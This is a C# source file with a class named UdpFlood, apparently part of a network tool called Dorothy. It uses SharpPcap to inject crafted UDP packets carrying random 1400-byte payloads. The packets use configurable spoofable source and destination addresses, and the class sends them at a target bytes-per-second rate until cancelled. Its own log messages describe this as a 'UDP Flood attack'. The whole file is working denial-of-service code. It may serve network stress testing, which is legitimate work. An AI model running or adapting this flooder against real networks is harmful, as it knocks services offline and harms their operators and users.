using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;

namespace Dorothy.Models
{
    public class UdpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public UdpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting UDP Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => 
                        addr.Addr.ipAddress != null && 
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var random = new Random();
                var ethernetPacket = new EthernetPacket(
                    PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", "")),
                    PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", "")),
                    EthernetType.IPv4);

                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Udp,
                    TimeToLive = _params.Ttl
                };

                var udpPacket = new UdpPacket(
                    (ushort)_params.SourcePort,
                    (ushort)_params.DestinationPort)
                {
                    PayloadData = new byte[1400]
                };

                random.NextBytes(udpPacket.PayloadData);
                ipPacket.PayloadPacket = udpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                double packetSize = ethernetPacket.Bytes.Length;
                int packetsPerSecond = (int)Math.Ceiling(_params.BytesPerSecond / packetSize);
                int batchSize = 100;
                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;

                Logger.Info($"UDP Flood: Sending {packetsPerSecond} packets per second ({_params.BytesPerSecond / 125_000} Mbps).");

                await Task.Run(async () =>
                {
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                        {
                            injectionDevice.SendPacket(ethernetPacket);
                        }
                        await Task.Delay(TimeSpan.FromMicroseconds(delayMicroseconds));
                    }
                });
            }
            catch (TaskCanceledException)
            {
                Logger.Info("UDP Flood attack was canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "UDP Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
} 